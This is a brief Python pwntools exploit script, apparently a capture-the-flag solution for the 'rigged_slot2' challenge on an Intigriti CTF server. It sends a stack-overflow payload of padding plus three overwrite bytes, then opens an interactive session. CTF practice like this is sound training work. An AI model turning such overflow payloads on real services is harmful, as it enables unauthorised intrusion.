from pwn import *

#io = process("./rigged_slot2")
io = remote("riggedslot2.ctf.intigriti.io", 1337)

payload = b"".join([
    b"A"*20,
    b"\x4d",
    b"\x68",
    b"\x14"
])

io.recv()

io.sendline(payload)

io.sendlineafter("Enter your bet amount (up to $100 per spin): ", b"1")

io.interactive()